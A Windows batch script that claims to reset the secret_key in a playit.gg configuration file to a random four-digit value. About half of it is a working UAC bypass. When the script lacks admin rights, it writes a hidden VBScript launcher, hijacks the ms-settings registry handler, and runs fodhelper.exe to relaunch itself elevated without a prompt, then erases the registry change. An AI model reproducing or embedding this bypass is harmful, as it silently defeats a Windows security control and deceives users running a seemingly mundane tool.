@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    goto :bypass
)
@echo off
setlocal enabledelayedexpansion

:: Detect current user and file path
set "file=%USERPROFILE%\AppData\Local\playit_gg\playit.toml"

:: Generate random 4-digit secret key
set /a new_key=%RANDOM% %% 9000 + 1000

:: Replace secret_key using PowerShell
powershell -Command "(Get-Content '%file%') | ForEach-Object { $_ -replace 'secret_key\s*=\s*\".*\"','secret_key = \"!new_key!\"' } | Set-Content '%file%'"

echo secret_key updated to !new_key!
exit


pause
:bypass
cd %temp%
echo "%~f0">help.bat
echo Set WshShell = CreateObject("WScript.Shell") > run.vbs
echo Function RunCommand(cmd) >> run.vbs
echo     Dim temp >> run.vbs
echo     temp = Replace(cmd, " ", Chr(32)) >> run.vbs
echo     RunCommand = temp >> run.vbs
echo End Function >> run.vbs
echo WshShell.Run RunCommand("cmd /c cd %temp% & help.bat"), 0, False >> run.vbs
echo Set WshShell = Nothing >> run.vbs


set "payload=wscript.exe %temp%\run.vbs"
echo %payload%
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "%payload%" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
start fodhelper.exe
timeout /t 5 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f